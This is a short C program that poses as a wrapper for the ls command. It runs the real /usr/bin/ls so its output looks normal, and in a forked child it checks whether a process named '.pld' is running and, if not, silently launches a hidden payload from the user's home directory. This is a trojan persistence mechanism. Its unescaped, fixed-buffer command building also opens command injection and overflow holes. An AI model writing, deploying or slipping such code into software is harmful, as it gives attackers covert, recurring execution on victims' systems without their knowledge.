/******************
 * Author:MuoDoo  *
 ******************/
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <dirent.h>
#include <string.h>
#include <stdlib.h>
const char* bin = "/usr/bin/ls",* pidName="\\.pld";

int main(int argc,char* argv[])
{
	pid_t fpid;
	int orin=getpid();
	fpid=fork();
	if(fpid==0) {
		char cmd[150];
		FILE *fp;
		sprintf(cmd,"ps -ef | grep %s | grep -v grep | wc -l",pidName);
		fp = popen(cmd,"r");
		char buf[500];
		fgets(buf,300,fp);
		int count = atoi(buf);
		char payloadName[100];
		sprintf(payloadName,"~/%s",pidName);
		if(count==0)
			system(payloadName);
		else return 0;
	}
	else {
	char buf[500];
	if(argc!=1) {
		char * pos = buf + sprintf(buf,"%s ",bin);
		for(int i = 1;i<argc;++i) {
			pos += sprintf(pos," %s ",argv[i]);
		}
		sprintf(pos," --color=auto");
	}
	else sprintf(buf,"%s --color=auto",bin);
	system(buf);
	}
	return 0;
}
